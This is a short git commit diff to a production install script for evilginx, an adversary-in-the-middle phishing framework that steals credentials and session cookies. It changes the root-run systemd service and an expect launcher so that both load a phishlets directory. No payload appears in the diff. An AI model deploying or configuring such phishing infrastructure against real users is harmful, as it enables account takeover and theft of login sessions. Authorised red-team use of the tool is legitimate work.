177491da4751c276bc9d944c91283ee783fdf8af
Ginahoffman <Karielyc14@gmail.com>
2026-05-16 19:30:44 -0700

    FIXED

--- scripts/install-prod.sh
+++ scripts/install-prod.sh
@@ -586,7 +586,7 @@ Wants=network-online.target
 Type=simple
 User=root
 WorkingDirectory=$EVILGINX_DIR
-ExecStart=/usr/local/bin/evilginx
+ExecStart=/usr/local/bin/evilginx -p $EVILGINX_DIR/phishlets
 Restart=always
 RestartSec=5
 StandardOutput=journal
@@ -619,7 +619,7 @@ EOF
 set timeout 10
 log_user 1
 
-spawn /usr/local/bin/evilginx
+spawn /usr/local/bin/evilginx -p $EVILGINX_DIR/phishlets
 
 expect {
     ">" { 
